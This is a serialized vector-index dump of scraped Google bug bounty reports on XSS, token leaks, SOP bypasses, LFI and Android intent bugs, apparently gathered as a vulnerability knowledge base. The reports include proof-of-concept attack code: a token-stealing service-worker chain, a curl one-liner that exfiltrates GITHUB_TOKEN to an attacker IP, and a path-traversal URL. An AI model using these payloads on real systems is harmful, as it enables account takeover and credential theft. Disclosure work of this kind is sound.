user.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1407, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f89fbf74-9911-4f14-a8ee-965d2d7a1565": {"__data__": {"id_": "f89fbf74-9911-4f14-a8ee-965d2d7a1565", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.txt", "file_name": "20250408_175642_797159.txt", "file_type": "text/plain", "file_size": 2655, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b0f9bd5f-c05b-4d41-99b9-9d7acde949af", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.txt", "file_name": "20250408_175642_797159.txt", "file_type": "text/plain", "file_size": 2655, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "9b295ab0c88415d1b23d2266b09572ef316449847dd766565f6c8145b5c2e283", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nInsecure debugger on Project IDX\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n16:54 | May 6, 2024\r\naccepted\r\n19:51 | May 6, 2024\r\nfixed\r\n02:11 | Aug 23, 2024\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nInsecure debugger on Project IDX\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://idx.google.com/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nFeature being abused:\r\nhttps://developers.google.com/idx/guides/debug-in-idx#chrome-devtools\r\nCreate project as simple html.\r\nOnce loaded, Take the <ID> from an iframe in the format\r\nhttps://9000-monospace-<ID>.cloudworkstations.dev\r\n(In a real attack this could be leaked from the network)\r\nRun the following from any website replacing <ID> with your own ID.\r\n// Vulnerable debugger proxy (Runs any js code you want, Fetch as the victims server)\r\nlet target = 'https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=';\r\n\r\n\r\n// Link to our service worker\r\nlet proxy = new URL('https://terjanq.me/xss.php');\r\nproxy.searchParams.set('ct', 'application/javascript');\r\nproxyPayload = `\r\nself.addEventListener(\"fetch\", (event) => {\r\n let url = event.request.url;\r\n // Leak token from network since its a httponly cookie\r\n if (url.includes(\"_workstation/login\")) {\r\n  console.info('\ud83c\udf89 Leaked token: '+url);\r\n }\r\n});\r\n`;\r\nproxy.searchParams.set('html', proxyPayload);\r\n\r\n\r\n// Link to force a reauth\r\nlet reauth = new URL('https://terjanq.me/xss.php');\r\nreauth.searchParams.set('h[Clear-Site-Data]', '\"cookies\"');\r\nreauthPayload = `\r\nsetTimeout(() => { location.href=location.origin }, 3000);\r\n`;\r\nreauth.searchParams.set('js', reauthPayload);\r\n\r\n\r\n// Link to create service work\r\nlet setup = new URL('https://terjanq.me/xss.php');\r\nsetupPayload = `\r\nnavigator.serviceWorker.register(\"${target+encodeURIComponent(proxy.href)}\");\r\nsetTimeout(() => { location.href=\"${target+encodeURIComponent(reauth.href)}\" }, 3000);\r\n`;\r\nsetup.searchParams.set('js', setupPayload);\r\n\r\n\r\n// Do the stuff\r\nlocation = target+encodeURIComponent(setup.href);\r\nIn the console you should see a message that says \"leaked token\" of the format\r\nhttps://8282-monospace-<ID>.cloudworkstations.dev/_workstation/login?redirect=<secret>\r\nin a new browser go to that URL and you will be logged in to the debugger.\r\nYou will have got a\r\nWorkstaionJwt\r\nfrom that by changing the domain of this cookie for example to\r\n80-monospace-<ID>.cloudworkstations.dev\r\nyou can login to the IDE!\r\nAttack scenario\r\nProject IDX takeover via local network attacker.\r\nThis is experimental and I'm not expecting a reward for this but you might want to know before full release :)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2636, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2f4d7581-7733-4ee3-8d6f-42244a04365f": {"__data__": {"id_": "2f4d7581-7733-4ee3-8d6f-42244a04365f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "42410e12-a60a-4737-a944-b2aca4de4282", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7d491f408617fbe27b6f2dc06c51558511432f015fad9f1df496c63f1281ee83", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "981b5c60-d621-4485-8c44-50dee3eac023", "node_type": "1", "metadata": {}, "hash": "b55f7efcd30474b2f5e6bd22dbf7f3e0b34a0c05f826275ea8264a9398bda62d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGITHUB_TOKEN leak that gives `issue: write` and `id-token: write` permissions to `GoogleCloudPlatform/alloydb-java-connector` repository\r\nReported by:\r\nVasilii Ermilov\r\nGoogle VRP\r\ntriaged\r\n22:30 | Apr 23, 2024\r\naccepted\r\n08:29 | Apr 25, 2024\r\nfixed\r\n16:02 | May 9, 2024\r\nreward decided\r\n$100\r\nSummary:\r\nGITHUB_TOKEN leak that gives\r\nissue: write\r\nand\r\nid-token: write\r\npermissions to\r\nGoogleCloudPlatform/alloydb-java-connector\r\nrepository\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nSummary:\r\nDue to users code checkout in\r\nci.yaml\r\nGithub action\r\n, it's possible for an attacker to craft a Pull Request that will contain malicious\r\n.kokoro/build.sh\r\nfile with a script that will be executed at\r\nCheck Coverage\r\nstep\r\nand will extract GITHUB_TOKEN secret that is used for running workflow and has\r\nissue: write\r\nand\r\nid-token: write\r\npermissions for the repository.\r\nmore information in the docs:\r\nhttps://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner\r\nDetails:\r\nGithub action is started on Pull Request via\r\nci.yaml\r\nAction can be triggered by\r\npull_request_target:\r\nevent , which does not require approval from the owner of the repo.\r\nHowever,\r\npull_request_target\r\nevent must be\r\n\"labeled\"\r\nSince, there is the\r\nauto-label\r\nbot\r\nenabled\r\nfor this repository, it is possible to craft a PR title, e.g. \"spanner: ignored\" that will be automatically labeled with \"api: spanner\" tag (\r\nDocumentation\r\n) and\r\npull_request_target\r\nevent will be trigered.\r\nAfter that, the code submitted in the PR is checked out at\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector/blob/55e39d9138a5bd9061420307b67a467ddb2b9555/.github/workflows/ci.yaml#L46\r\nwithout\r\npersist-credentials: false\r\nwhich means that GITHUB_TOKEN is stored in the filesystem (\r\nlink\r\n) of the machine that is running the workflow and can be extracted with malicious bash scripts submitted by attacker and executed in the\r\nRun tests\r\nstep\r\nIn most cases it is possible to exfiltrate the\r\nGITHUB_TOKEN\r\nwith the following technique.\r\nfind $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}\r\nThis works because the\r\nactions/checkout\r\naction\r\npersists credentials with a local git config by default\r\n.\r\nThe supplied\r\n.kokoro/build.sh\r\nscript is run at\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector/blob/55e39d9138a5bd9061420307b67a467ddb2b9555/.github/workflows/ci.yaml#L46\r\nWhich gives opportunity for an attacker to craft a script that will exfiltrate\r\nGITHUB_TOKEN\r\nToken has\r\nissue: write\r\nand\r\nid-token: write\r\npermissions\r\nwhich can be used to tamper Issues and Pull Requests, e.g. approve PR or potentially exfiltrate cloud credentials that are used for this repository.\r\nMitigation\r\nAdd\r\npersist-credentials: false\r\nto\r\nCheckout code\r\nstep at\r\nhttps://github.com/GoogleCloudPlatform/alloydb-java-connector/blob/55e39d9138a5bd9061420307b67a467ddb2b9555/.github/workflows/ci.yaml#L44\r\nCheck for specific labels on the PR before running a job, e.g.\r\nhttps://github.com/GoogleCloudPlatform/cloud-sql-proxy/blob/HEAD/.github/workflows/lint.yaml#L26\r\nSupporting Material/References:\r\nhttps://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability\r\nhttps://securitylab.github.com/research/github-actions-preventing-pwn-requests/\r\nhttps://r2c.dev/blog/2021/protect-your-github-actions-with-semgrep/\r\nAttack scenario\r\nThe attack can be triggered by any Github account without interaction with the owner of the repository.\r\nImpact\r\nGITHUB_TOKEN is leaked\r\nAttacker gets write access to Issues and Pull Requests of\r\nGoogleCloudPlatform/alloydb-java-connector\r\nrepository, including PR approval.\r\nAttacker gets write access to\r\nid-token\r\nand potentially has opprotunity to get cloud credentials that are used for this repository.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3975, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "981b5c60-d621-4485-8c44-50dee3eac023": {"__data__": {"id_": "981b5c60-d621-4485-8c44-50dee3eac023", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "42410e12-a60a-4737-a944-b2aca4de4282", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7d491f408617fbe27b6f2dc06c51558511432f015fad9f1df496c63f1281ee83", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "2f4d7581-7733-4ee3-8d6f-42244a04365f", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.txt", "file_name": "20250408_175642_833802.txt", "file_type": "text/plain", "file_size": 4011, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "25995a13e12a0e815a84aab610ee1c36ca45e74e881472d2b8fbf955d278d7e6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "https://github.com/GoogleCloudPlatform/cloud-sql-proxy/blob/HEAD/.github/workflows/lint.yaml#L26\r\nSupporting Material/References:\r\nhttps://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability\r\nhttps://securitylab.github.com/research/github-actions-preventing-pwn-requests/\r\nhttps://r2c.dev/blog/2021/protect-your-github-actions-with-semgrep/\r\nAttack scenario\r\nThe attack can be triggered by any Github account without interaction with the owner of the repository.\r\nImpact\r\nGITHUB_TOKEN is leaked\r\nAttacker gets write access to Issues and Pull Requests of\r\nGoogleCloudPlatform/alloydb-java-connector\r\nrepository, including PR approval.\r\nAttacker gets write access to\r\nid-token\r\nand potentially has opprotunity to get cloud credentials that are used for this repository.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3191, "end_char_idx": 3995, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e97a3d2c-a96d-4d39-bd8e-d8503f877996": {"__data__": {"id_": "e97a3d2c-a96d-4d39-bd8e-d8503f877996", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.txt", "file_name": "20250408_175642_865163.txt", "file_type": "text/plain", "file_size": 2515, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "920aa792-28cb-4fa9-b09e-72482eededd2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.txt", "file_name": "20250408_175642_865163.txt", "file_type": "text/plain", "file_size": 2515, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "b934a8fb054a00e8a9274ba81407f63dc2fec738876893d24c218ecc0e3e07a9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nSOP bugs in Google Scholar PDF Reader\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n16:12 | Apr 17, 2024\r\naccepted\r\n16:51 | Apr 18, 2024\r\ntriaged\r\n14:41 | Apr 19, 2024\r\naccepted\r\n16:08 | Apr 19, 2024\r\nfixed\r\n23:43 | Jun 16, 2024\r\nSummary:\r\nSOP bugs in Google Scholar PDF Reader\r\nProduct:\r\nGoogle Scholar\r\nURL:\r\nhttps://chromewebstore.google.com/detail/google-scholar-pdf-reader/dahenjhkoodjbpjheillcadbppiidmhp\r\nVulnerability type:\r\nSite Isolation Bypass\r\nDetails\r\n--- BUG 1 (With compromised renderer) ---\r\n// In the context of a content script on any website.\r\n// Leaked data must be JSON parsable.\r\nlet x = chrome.runtime.connect();\r\nx.postMessage({type: 'fetch', method: 'GET', url: '\r\nhttps://www.google.com/something.json'\r\n, id: 1});\r\nx.onMessage.addListener(console.log);\r\n--- BUG 2 (Without compromised renderer) ---\r\n// Embed victim PDF from attacker page.\r\nlet f=document.createElement('iframe');\r\nf.width=1000;\r\nf.height=1000;\r\nf.src='\r\nhttps://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf'\r\n;\r\ndocument.body.appendChild(f);\r\n// Navigate nested, nested frame to attacker controled page with null origin.\r\nf.contentWindow[0][0].location = '\r\nhttps://terjanq.me/xss.php?h[Content-Security-Policy]=sandbox%20allow-scripts'\r\n;\r\n// I think this also creates a race condition version\r\n// On that attacker page, Make sure target page to leak is same-origin as the pdf\r\nhttps://services.google.com\r\nin this case.\r\nonmessage = async (e) => {\r\n let reader = e.data.body.pipeThrough(new TextDecoderStream()).getReader();\r\n let result = await reader.read();\r\n console.log(result.value);\r\n}\r\nparent.parent.postMessage({type: 'fetch', url: '\r\nhttps://services.google.com/example'}\r\n, '*');\r\n--- BUG 3 (Without compromised renderer) ---\r\nlet f=document.createElement('iframe');\r\nf.width=1000;\r\nf.height=1000;\r\nf.src='\r\nhttps://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf'\r\n;\r\ndocument.body.appendChild(f);\r\nSelected text gets leaked cross-origin.\r\nonmessage=console.log;\r\nf.contentWindow[0].postMessage({type: 'getSelectedText'}, '*');\r\nAttack scenario\r\nAn attacker controlled website can bypass SOP if one of the follow is met:\r\nAttacker wants JSON data and has a compromised renderer bug\r\nAttacker wants data from a origin that contains a PDF which allows embedding\r\nExtension owner of Google LLC has verified scholar.google.com the contact is\r\nscholar-chrome-extensions@google.com\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2499, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2f7ac366-2c49-4c01-a0a4-746127f91343": {"__data__": {"id_": "2f7ac366-2c49-4c01-a0a4-746127f91343", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.txt", "file_name": "20250408_175644_985957.txt", "file_type": "text/plain", "file_size": 883, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dadfc12e-71af-4507-8697-d01e17d37f9e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.txt", "file_name": "20250408_175644_985957.txt", "file_type": "text/plain", "file_size": 883, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "55a7cc9e15cb5b17b6a472b36eb5fe39af254b916ae71c06e6a1e40b0b5e101a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nLFI in knowyourdata-tfds.withgoogle.com\r\nReported by:\r\nRitik Singh\r\nGoogle VRP\r\ntriaged\r\n20:50 | Apr 12, 2024\r\naccepted\r\n15:11 | Apr 15, 2024\r\nfixed\r\n05:43 | Jun 14, 2024\r\nreward decided\r\n$1,337\r\nSummary:\r\nLFI in knowyourdata-tfds.withgoogle.com\r\nProduct:\r\nknowyourdata-tfds.withgoogle.com\r\nURL:\r\nhttps://knowyourdata-tfds.withgoogle.com/assets/onboarding/\r\nVulnerability type:\r\nFile Inclusion\r\nDetails\r\nLFI in knowyourdata-tfds.withgoogle.com\r\nPOC:-\r\nhttps://knowyourdata-tfds.withgoogle.com/assets/onboarding//..%2f..%2f..%2f..%2f..%2f..%2f__init__.py\r\nAttack scenario\r\nAn attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 867, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e102c32d-22b6-47b0-92c3-06dcd7e26666": {"__data__": {"id_": "e102c32d-22b6-47b0-92c3-06dcd7e26666", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.txt", "file_name": "20250408_175645_017204.txt", "file_type": "text/plain", "file_size": 3799, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "96afaff2-0c9f-4592-ae22-cb2160815cbf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.txt", "file_name": "20250408_175645_017204.txt", "file_type": "text/plain", "file_size": 3799, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a53ad5c9c142bf6e03ef8d272e09d2e5089e467578c6e602a41da92978936b14", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nChrome BROWSABLE intent:// bypass\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n07:13 | Apr 3, 2024\r\naccepted\r\n07:56 | Apr 4, 2024\r\nfixed\r\n00:20 | May 25, 2024\r\nSummary:\r\nChrome BROWSABLE intent:// bypass\r\nProduct:\r\nGoogle\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSandbox Escape\r\nDetails\r\nI created a chromium bug for this, please CC [REDACTED_EMAIL] \"it might be more straightforward to allowlist URIs we redirect to instead of blocking problematic ones.\"\r\nhttps://issuetracker.google.com/331834518\r\nonclick = () => { \r\n\r\n const target = 'intent://<some non-browsable intent>';\r\n const title = '<h1>Click the button to continue...</h1><p1> :)</p1>';\r\n\r\n  location.href = 'intent://arvr.google.com/scene-viewer/1.2?file=https%3A%2F%2Fstorage.googleapis.com%2Far-answers-in-search-models%2Fstatic%2FMallardDuck%2Fmodel.glb&title=' + encodeURIComponent(title) + '&link=' + encodeURIComponent(target) + '#Intent;package=com.google.android.googlequicksearchbox;scheme=https;end'; \r\n\r\n}\r\nOn an Android device replace <some non-browsable intent> with some non-browsable intent this could look like\r\nintent://foo#Intent;package=com.example.myapplication;scheme=bar;end\r\nThe host \"foo\" is displayed to the user.\r\nA host is an optional intent parameter.\r\nPutting an attacker controlled intent into startActivity() without sanitization.\r\nBottomViewGroup.java\r\nprivate void openLink(Uri uri) {\r\n        Uri outboundLink = UriUtilities.getOutboundLink(uri);\r\n        if (outboundLink != null) {\r\n            if (INTENT_SCHEME.equals(outboundLink.getScheme())) {\r\n                try {\r\n                    Intent parseUri = Intent.parseUri(outboundLink.toString(), 1);\r\n                    if (parseUri != null) {\r\n                        getContext().startActivity(parseUri);\r\n                    }\r\n                } catch (URISyntaxException e) {\r\n                    ((hoch) ((hoch) ((hoch) logger.d()).g(e)).aa(41236)).p(\"Failed to parse intent URI\");\r\n                }\r\n            } else {\r\n                ViewerLogger.getInstance().logAction(ArViewerLogEnumOuterClass.ArViewerLogEnum.Action.OPEN_LINK);\r\n                ((hoch) ((hoch) logger.c()).aa(41235)).s(\"Opening link: %s\", outboundLink);\r\n                new ast().a().a(getContext(), outboundLink);\r\n            }\r\n        }\r\n    }\r\nUriUtilities.java\r\npublic static Uri getOutboundLink(Uri uri) {\r\n        if (uri == null) {\r\n            return null;\r\n        }\r\n        return uri.buildUpon().appendQueryParameter(UTM_SOURCE_PARAMETER, UTM_SOURCE_VALUE).build();\r\n    }\r\nAttack scenario\r\nA website is able to send intents that are not marked as android.intent.category.BROWSABLE\r\nhttps://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE\r\nThis is an attack known as\r\nhttps://developer.android.com/privacy-and-security/risks/intent-redirection\r\nits recommended to only launch untrusted intents with the opt-in CATEGORY, chromium would normally have done this but this app bypasses the protection via a tap of a button.\r\nAnd since\r\ntitle\r\nsupports basic html its possible to make it clear that button should be tapped.\r\nThis also acts as a bypass to\r\nhttps://issues.chromium.org/40060327\r\nas shown in\r\nhttps://drive.google.com/open?id=1ccNnVavSY2rg1cG5r7IMfdSC9XDHCYMA&authuser=0\r\nNOT ABOUT THE OPEN REDIRECT\r\nThe problem is that a different browser can be outdated and contain security issues that don't exist or where since patched in chrome.\r\nI felt like this issue needed more then a comment to explain.\r\n\"This seems to be an issue with the AR scene viewer rather than Chrome, since if I understand correctly it is (correctly) handling this intent to it.\"\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3783, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9a0af945-0c3b-40f8-b9d7-4846e25c1986": {"__data__": {"id_": "9a0af945-0c3b-40f8-b9d7-4846e25c1986", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.txt", "file_name": "20250408_175645_048674.txt", "file_type": "text/plain", "file_size": 1732, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "27eb8e21-c697-4749-8f32-5d43a2dbeb0d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.txt", "file_name": "20250408_175645_048674.txt", "file_type": "text/plain", "file_size": 1732, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "b3e103b9ae57a216b229024400b91065786a2b53b240003fa0b83bc14a4714a0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle app spoofing\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n03:30 | Mar 29, 2024\r\naccepted\r\n06:30 | Mar 29, 2024\r\nfixed\r\n05:04 | Sep 6, 2024\r\ntriaged\r\n15:17 | Sep 17, 2024\r\naccepted\r\n16:11 | Sep 17, 2024\r\nfixed\r\n16:43 | Sep 29, 2024\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nGoogle app spoofing\r\nProduct:\r\nGoogle\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSecurity UI Spoofing\r\nDetails\r\n<a href=\"faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://sites.google.com/view/ndevtkembed/home\">tap</a>\r\nintentSpoof.mp4\r\n<a href=\"intent://arvr.google.com/scene-viewer/1.2?file=https%3A%2F%2Fstorage.googleapis.com%2Far-answers-in-search-models%2Fstatic%2FMallardDuck%2Fmodel.glb&card_content=https%3A%2F%2Fstorage.googleapis.com%2Fndevtk%2Fndevtk-spoof9.html&mode=3d_only#Intent;package=com.google.android.googlequicksearchbox;scheme=https;end;\">tap</a>\r\nduckSpoof.mp4\r\nThere is also a feature of the scene viewer to stream interactive fullscreen content from a server called Immersive Stream for XR. (Not just a 3d duck that opens a delayed fullscreen webview)\r\nAttack scenario\r\nA website gets put in fullscreen without the warning toast allowing control of the URL bar.\r\nNormally when a website uses the API after user activation a message is shown to tell the user there in fullscreen and how to exit this is important because it means the security UI can no longer be trusted as it can be spoofed.\r\nWhile the \"line of death\" may not be effective its all there is for preventing spoofs of this kind.\r\nhttps://emilymstark.com/2022/12/18/death-to-the-line-of-death.html\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1716, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1f62e9b4-d9ac-4492-8aaf-219c53516252": {"__data__": {"id_": "1f62e9b4-d9ac-4492-8aaf-219c53516252", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.txt", "file_name": "20250408_175645_127626.txt", "file_type": "text/plain", "file_size": 2779, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4f454957-0da8-4138-bc5e-10cd78c3aa21", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.txt", "file_name": "20250408_175645_127626.txt", "file_type": "text/plain", "file_size": 2779, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "b77c428151e0bd9fc447345e0fe929c377f89634d725990b253b2723e993e567", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nfix toJSON spelling in firestore sdk\r\nReported by:\r\nAbhishek Mathur\r\nGoogle VRP\r\ntriaged\r\n07:16 | Feb 13, 2024\r\naccepted\r\n20:01 | Feb 28, 2024\r\nfixed\r\n18:41 | Jun 24, 2024\r\nSummary:\r\nfix toJSON spelling in firestore sdk\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/googleapis/nodejs-firestore\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi,\r\nLanguage: NodeJS\r\nNPM Repository:\r\nhttps://www.npmjs.com/package/@google-cloud/firestore\r\nCode Repository:\r\nhttps://github.com/googleapis/nodejs-firestore\r\nI found out that the wrong spelling of toJSON function ( it was toJson ) could leak to the firestore key getting leaked out when JSON.stringify() is run on any firestore object since all of them contain an internal reference to the firestore object having _settings object which has the private key\r\nI raised a Pull request highlighting the 